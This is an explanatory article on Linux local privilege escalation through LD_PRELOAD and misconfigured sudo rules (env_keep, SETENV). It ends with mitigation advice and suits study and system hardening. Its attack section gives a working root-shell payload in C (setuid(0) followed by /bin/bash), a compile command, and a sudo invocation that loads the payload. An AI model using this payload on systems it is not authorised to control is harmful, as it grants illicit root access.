Linux Privilege Escalation via Shared Library Preloading

Shared library preloading is a Linux feature that allows users to force the dynamic linker to load specified shared objects before any system libraries. While primarily designed for debugging, performance profiling, and software patching, this mechanism can be exploited for local privilege escalation when system configurations inadvertently allow environment variables to persist across security boundaries. This article details the mechanics of shared library preloading, how attackers leverage environment variables like LD_PRELOAD to intercept function calls, and the misconfigurations that turn this debugging feature into a root-level exploit.

The Dynamic Linker and Preloading Mechanism

In modern Linux distributions, dynamically linked executables do not contain all the machine code necessary to run. Instead, when a binary is executed, the dynamic linker—typically ld.so or ld-linux.so—resolves external dependencies and links shared libraries (such as the standard C library, libc.so) at runtime.

The dynamic linker consults specific environment variables before processing default libraries:

  • LD_PRELOAD: Points to one or more user-defined shared libraries (.so files) that must be loaded prior to any other library.
  • /etc/ld.so.preload: A system-wide configuration file achieving the same outcome for all processes.

Because functions defined in earlier loaded libraries take precedence over identically named functions loaded later, preloading enables function hooking. If an attacker's preloaded library defines a standard function such as geteuid() or fopen(), the linker binds the target program's function calls to the attacker's custom implementation rather than the legitimate system library.

The SUID Defense Boundary

To protect against obvious privilege escalation, the dynamic linker includes built-in security checks. When an executable with the SUID (Set User ID) or SGID (Set Group ID) bit is executed, the process's effective user ID (EUID) differs from its real user ID (RUID).

In such cases, the kernel marks the binary with the AT_SECURE auxiliary vector flag. Upon detecting this condition, the dynamic linker drops or ignores potentially dangerous environment variables, including LD_PRELOAD and LD_LIBRARY_PATH. As a result, users cannot simply run LD_PRELOAD=/path/to/malicious.so /usr/bin/passwd to gain unauthorized root execution.

Exploitation via Sudo and Environment Preservation

The primary avenue for local privilege escalation via shared library preloading occurs through sudo misconfigurations rather than direct SUID exploitation.

By default, modern versions of sudo use the env_reset directive in /etc/sudoers to sanitize the execution environment, clearing variables like LD_PRELOAD before launching the target command with administrative rights. However, privilege escalation becomes possible when:

  1. A user is granted rights to execute one or more commands via sudo.
  2. The /etc/sudoers configuration explicitly preserves user-specified environment variables through directives such as: 
    Defaults env_keep += "LD_PRELOAD"
    Or by applying the SETENV tag to a specific user's rule: 
    attacker ALL=(root) SETENV: /usr/bin/find

Under these conditions, sudo bypasses default sanitization routines and passes the user's LD_PRELOAD value into the newly spawned root process.

Anatomy of an Attack

A local attacker exploiting this vulnerability performs the following steps:

  1. Crafting the Malicious Shared Object:
    The attacker writes a C source file containing code designed to execute immediately upon being loaded into memory. This is achieved using the GCC constructor attribute:

    #include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

    Alternatively, declaring a function with __attribute__((constructor)) ensures the payload runs before the target program's main() function is called.

  2. Compiling the Shared Library:
    The payload is compiled into a shared object without standard system hooks:

    gcc -fPIC -shared -nostartfiles -o /tmp/payload.so payload.c

  3. Executing the Target Command:
    The attacker executes the permitted sudo binary while passing the library path:

    sudo LD_PRELOAD=/tmp/payload.so /usr/bin/find

    When the target program launches with root permissions, the dynamic linker loads /tmp/payload.so first. The initialization routine triggers, sets the execution identity to root (UID 0 and GID 0), and spawns an interactive root shell, completely bypassing the intended functionality of the target command.

Prevention and Mitigation

Mitigating library preloading exploits requires enforcing strict environment hygiene:

  • Maintain Default Environment Sanitization: Ensure Defaults env_reset remains active in /etc/sudoers.
  • Avoid env_keep with Linker Variables: Never append LD_PRELOAD, LD_LIBRARY_PATH, or related variables to env_keep.
  • Avoid the SETENV Tag: Refrain from granting SETENV privileges unless strictly required, and pair it with explicit binary restrictions rather than broad operational profiles.
